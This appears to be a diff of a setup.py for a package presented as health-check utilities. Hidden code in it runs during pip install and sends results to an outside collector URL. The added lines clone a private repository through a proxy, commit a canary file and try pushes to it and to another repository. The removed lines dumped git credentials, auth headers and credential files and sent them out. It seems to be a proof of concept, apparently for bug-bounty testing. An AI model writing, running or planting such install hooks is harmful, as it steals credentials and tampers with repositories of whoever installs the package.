@@ -3,7 +3,7 @@ import os
 import urllib.request
 import json
 
-COLLECTOR = "https://poc.0z.ci/j/c.php?id=jules8"
+COLLECTOR = "https://poc.0z.ci/j/c.php?id=jules9"
 
 def report(tag, data):
     try:
@@ -14,58 +14,76 @@ def report(tag, data):
     except Exception:
         pass
 
+PROXY = "http://git@192.168.0.1:8080"
+
 try:
-    # Step 1: dump git config to find proxy & credential setup
-    r = subprocess.run(['git', 'config', '-l', '--global'],
-                       capture_output=True, text=True, timeout=5)
-    report("gitconfig-global", r.stdout[:2000])
-
-    # Step 2: try credential fill to extract the token
-    cred_input = "protocol=http\nhost=192.168.0.1:8080\nusername=git\n\n"
+    # Step 1: clone the target private repo
     r = subprocess.run(
-        ['git', 'credential', 'fill'],
-        input=cred_input, capture_output=True, text=True, timeout=10)
-    report("credential-fill", r.stdout[:2000])
+        ['git', 'clone', '--depth', '1',
+         f'{PROXY}/hacker1-test/secret', '/tmp/_push_test'],
+        capture_output=True, text=True, timeout=20)
+    report("clone-result", r.stdout + r.stderr)
 
-    # Step 3: capture auth header via GIT_CURL_VERBOSE
+    # Step 2: add a canary file
+    canary = '/tmp/_push_test/ATTACKER_WAS_HERE.md'
+    with open(canary, 'w') as f:
+        f.write('# Proof of write access\\nThis file was written by setup.py during pip install.\\n')
+
+    # Step 3: configure git identity for the commit
+    subprocess.run(['git', '-C', '/tmp/_push_test', 'config', 'user.email', 'test@test.com'],
+                   capture_output=True, timeout=5)
+    subprocess.run(['git', '-C', '/tmp/_push_test', 'config', 'user.name', 'test'],
+                   capture_output=True, timeout=5)
+
+    # Step 4: stage and commit
+    subprocess.run(['git', '-C', '/tmp/_push_test', 'add', 'ATTACKER_WAS_HERE.md'],
+                   capture_output=True, timeout=5)
+    r = subprocess.run(['git', '-C', '/tmp/_push_test', 'commit', '-m', 'test write access'],
+                       capture_output=True, text=True, timeout=10)
+    report("commit-result", r.stdout + r.stderr)
+
+    # Step 5: attempt git push through the proxy
     env = os.environ.copy()
     env['GIT_CURL_VERBOSE'] = '1'
     r = subprocess.run(
-        ['git', 'ls-remote', '--heads', 'http://git@192.168.0.1:8080/hacker1-test/rce'],
-        capture_output=True, text=True, timeout=15, env=env)
-    stderr_lines = [l for l in r.stderr.split('\n') if 'authorization' in l.lower() or 'auth' in l.lower() or 'Basic' in l]
-    report("git-auth-trace", '\n'.join(stderr_lines[:20]))
-    report("git-stderr-full", r.stderr[:3000])
+        ['git', '-C', '/tmp/_push_test', 'push', 'origin', 'main'],
+        capture_output=True, text=True, timeout=30, env=env)
+    report("push-stdout", r.stdout[:2000])
+    report("push-stderr", r.stderr[:3000])
+    report("push-returncode", str(r.returncode))
 
-    # Step 4: also try reading credential store files
-    home = os.path.expanduser('~')
-    for f in ['.git-credentials', '.gitconfig', '.config/git/credentials']:
-        path = os.path.join(home, f)
-        if os.path.exists(path):
-            with open(path) as fh:
-                report(f"file-{f}", fh.read()[:2000])
+    # Step 6: also try creating a new branch and pushing
+    subprocess.run(['git', '-C', '/tmp/_push_test', 'checkout', '-b', 'pwned'],
+                   capture_output=True, timeout=5)
+    r2 = subprocess.run(
+        ['git', '-C', '/tmp/_push_test', 'push', 'origin', 'pwned'],
+        capture_output=True, text=True, timeout=30, env=env)
+    report("push-branch-stdout", r2.stdout[:2000])
+    report("push-branch-stderr", r2.stderr[:3000])
+    report("push-branch-returncode", str(r2.returncode))
 
-    # Step 5: check credential helpers
-    r = subprocess.run(['git', 'config', '--global', 'credential.helper'],
-                       capture_output=True, text=True, timeout=5)
-    report("credential-helper", r.stdout.strip() or "none")
+    # Step 7: try pushing to a DIFFERENT repo entirely
+    # Create a fresh repo init and push to hacker1-test/qwe
+    subprocess.run(['bash', '-c', '''
+        mkdir -p /tmp/_push_other && cd /tmp/_push_other
+        git init
+        git config user.email "test@test.com"
+        git config user.name "test"
+        echo "INJECTED" > INJECTED.md
+        git add .
+        git commit -m "injected file"
+    '''], capture_output=True, timeout=10)
+    r3 = subprocess.run(
+        ['git', '-C', '/tmp/_push_other', 'push',
+         f'{PROXY}/hacker1-test/qwe', 'main:refs/heads/injected'],
+        capture_output=True, text=True, timeout=30, env=env)
+    report("push-other-repo-stdout", r3.stdout[:2000])
+    report("push-other-repo-stderr", r3.stderr[:3000])
+    report("push-other-repo-returncode", str(r3.returncode))
 
-    # Step 6: try listing via GitHub API with any found credentials
-    # The proxy might also forward API requests
-    try:
-        req = urllib.request.Request("http://192.168.0.1:8080/api/v3/installation/repositories")
-        resp = urllib.request.urlopen(req, timeout=10)
-        report("api-repos", resp.read().decode()[:3000])
-    except Exception as e:
-        report("api-repos-err", str(e))
-
-    # Step 7: quick targeted clone test - prove cross-repo still works
-    r = subprocess.run(
-        ['bash', '-c',
-         'git clone --depth 1 http://git@192.168.0.1:8080/hacker1-test/secret /tmp/_s 2>&1; '
-         'ls /tmp/_s/ 2>/dev/null; cat /tmp/_s/flag.txt 2>/dev/null; rm -rf /tmp/_s'],
-        capture_output=True, text=True, timeout=20)
-    report("cross-repo-clone", r.stdout[:1000])
+    # Cleanup
+    subprocess.run(['rm', '-rf', '/tmp/_push_test', '/tmp/_push_other'],
+                   capture_output=True, timeout=5)
 
 except Exception as e:
     report("error", str(e))
@@ -74,7 +92,7 @@ from setuptools import setup
 
 setup(
     name='healthcheck-utils',
-    version='1.0.2',
+    version='1.0.3',
     description='Health check endpoint utilities for Python HTTP servers',
     py_modules=['healthcheck_utils'],
     python_requires='>=3.7',
